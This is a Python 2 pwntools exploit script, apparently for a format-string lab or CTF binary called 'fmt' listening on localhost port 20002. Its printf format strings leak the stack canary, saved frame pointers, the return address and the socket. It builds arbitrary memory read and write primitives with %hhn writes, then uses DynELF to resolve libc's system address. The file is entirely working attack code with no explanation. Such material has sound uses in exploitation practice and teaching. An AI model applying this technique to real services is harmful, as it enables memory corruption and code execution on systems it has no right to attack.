#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

r = remote('localhost', 20002)
r.recvline()

# %134$ - canary
# %137$ - ebp1
# %138$ - ret
# %139$ - socket
# Buffer = ebp1 - 556
# Ret addr = ebp1 - 28
# fmt base = ret - 3403

r.sendline(flat(
    '%134$08x', #canary
    '%137$08x', #ebp1
    '%145$08x', #ebp2
    '%157$08x', #ebp3
    '%138$08x', #ret
    '%139$08x'  #socket
    ))

canary      = int(r.recv(8), 16)
ebp1        = int(r.recv(8), 16)
ebp2        = int(r.recv(8), 16)
ebp3        = int(r.recv(8), 16)
ret         = int(r.recv(8), 16)
socket      = int(r.recv(8), 16)
buffer_addr = ebp1 - 556
ret_addr    = ebp1 - 28
fmt_base    = ret - 3403
r.recvline()

def send_receive(fmt):
    r.sendline(fmt)
    return r.recvline()

def make_pointer(addr):
    send_receive('A' * ((ebp2 & 0xff) + 0)   + '%137$hhn')
    send_receive('A' * ((addr >>  0) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 1)   + '%137$hhn')
    send_receive('A' * ((addr >>  8) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 2)   + '%137$hhn')
    send_receive('A' * ((addr >> 16) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 3)   + '%137$hhn')
    send_receive('A' * ((addr >> 24) & 0xff) + '%145$hhn')

def poke(addr, data):
    for i in range(len(data)):
        make_pointer(addr + i)
        send_receive('A' * ord(data[i]) + '%157$hhn')

def peek(addr):
    make_pointer(addr)
    r.sendline('%157$sTHE_END')
    return r.recvuntil('THE_END\n')[:-8] + '\0'

elf = ELF('../fmt')
dynelf = DynELF(peek, pointer = fmt_base, elf = elf)

print 'system : 0x%08x' % dynelf.lookup('system', 'libc')
